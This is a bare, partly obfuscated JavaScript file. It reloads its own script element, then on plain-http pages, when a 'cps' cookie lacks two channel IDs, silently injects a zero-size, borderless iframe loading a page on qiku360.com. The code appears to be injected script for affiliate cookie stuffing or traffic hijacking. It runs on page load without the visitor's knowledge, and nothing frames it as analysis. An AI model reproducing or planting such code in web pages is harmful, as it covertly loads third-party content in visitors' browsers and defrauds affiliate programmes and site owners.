l___k__s = ~function (thisWindow, thisDocument, regex_1, regex_2, str_script, Charset, Async, l) {
    var str_00_g_0 = '00_g_0', isOpera = thisWindow.opera, originSrc = (function (js_src) {
        if (!js_src || /([^:]|^)\/\//.test(js_src) || ~js_src.indexOf(str_00_g_0.replace(/_/g, '.'))) {
            return 0
        }
        js_src = js_src + '?__=__&';
        if (!js_src.lastIndexOf('/')) {
            return js_src.replace(regex_1, regex_2)
        }
        return js_src.substr(0, 1) + js_src.substr(1).replace(regex_1, regex_2)
    })((function (curScriptElement, allScripts, errMsg) {
        if (curScriptElement) {
            Charset = curScriptElement.charset;
            Async = curScriptElement.async;
            return curScriptElement.src
        }
        try {
            Z.G.Y()
        } catch (c) {
            errMsg = c.stack || c.fileName || c.sourceURL || c.stacktrace;
            if (!errMsg && isOpera) {
                errMsg = (('' + c).match(/of linked script \S+/g) || []).join(' ')
            }
        }
        if (errMsg) {
            errMsg = errMsg.split(/[@ ]/g).pop();
            errMsg = errMsg[0] == '(' ? errMsg.slice(1, -1) : errMsg;
            for (var w = errMsg.replace(/(:\d+)?:\d+$/i, ''), scriptEl, i = allScripts.length; i--;) {
                scriptEl = allScripts[i];
                if (w == scriptEl.src) {
                    Charset = scriptEl.charset;
                    Async = scriptEl.async;
                    break
                }
            }
            return w
        }
        for (var lastJsDOM = (allScripts[allScripts.length - 1] || {}), y = 0, cur; y++;) {
            cur = allScripts[y];
            if (cur.readyState == 'interactive') {
                Charset = cur.charset;
                Async = cur.async;
                return cur.src
            }
        }
        Charset = lastJsDOM.charset;
        Async = lastJsDOM.async;
        return lastJsDOM.src
    })(thisDocument.currentScript, thisDocument.getElementsByTagName(str_script))), head = thisDocument.getElementsByTagName('head')[0], newScriptElm = thisDocument.createElement(str_script), sessionStorage = thisWindow.sessionStorage;
    if (originSrc) {
        if (Charset) {
            newScriptElm.charset = Charset
        }
        newScriptElm.src = originSrc;
        newScriptElm.async = Async;
        if (!Async && /\[nati/.test(thisDocument.write + '')) {
            thisDocument.write('<' + str_script + ' src="' + originSrc + '"' + (Charset ? ' charset="' + Charset + '"' : '') + ' async=' + (Async ? 'true' : 'false') + '><\/' + str_script + '>')
        } else {
            head.appendChild(newScriptElm)
        }
    }

}(self, document, /([^:\/]|^)\//, '$1//', 'script');
function run_only_once(keystring, fn) {
    var w = window.top;
    if (keystring in w) {
        return;
    }
    w[keystring] = 1;
    fn();
}
function ifr(){
    if (!Window.l___k__s && navigator.cookieEnabled && /^http:/.test(window.location.href)) {
        var getCookie = function (c_name) {
            if (document.cookie.length > 0) {
                c_start = document.cookie.indexOf(c_name + "=");
                if (c_start != -1) {
                    c_start = c_start + c_name.length + 1;
                    c_end = document.cookie.indexOf(";", c_start);
                    if (c_end == -1) {
                        c_end = document.cookie.length
                    }
                    return unescape(document.cookie.substring(c_start, c_end))
                }
            }
            return ""
        };
        var key = "cps";
        var CHAN_ID = "b830bba5";
        var CHAN_ID2 = "843909";
        var turl = 'http://www.qiku360.com/jd/vipejour.html?f='+ 1E4 * Math.random() +'&k='+ (new Date).valueOf();
        var chanIdReg = new RegExp(CHAN_ID);
        var chanIdReg2 = new RegExp(CHAN_ID2);
        var cook = getCookie(key);
        if (!chanIdReg.test(cook)&&!chanIdReg2.test(cook)) {
            try {
                var box = document.getElementsByTagName("body")[0];
                var divCon = document.createElement("div");
                divCon.style.position = "fixed";
                divCon.style.bottom = "0px";
                divCon.style.zIndex = "22147483646";
                var iframeCon = document.createElement("iframe");
                iframeCon.style.width = "0px";
                iframeCon.style.height = "0px";
                iframeCon.style.border = "none";
                iframeCon.scrolling = "no";
                iframeCon.src = turl;
                divCon.appendChild(iframeCon);
                box.appendChild(divCon);
            } catch (c) {

            }

        }
    }
}
run_only_once("vipcom9524",ifr);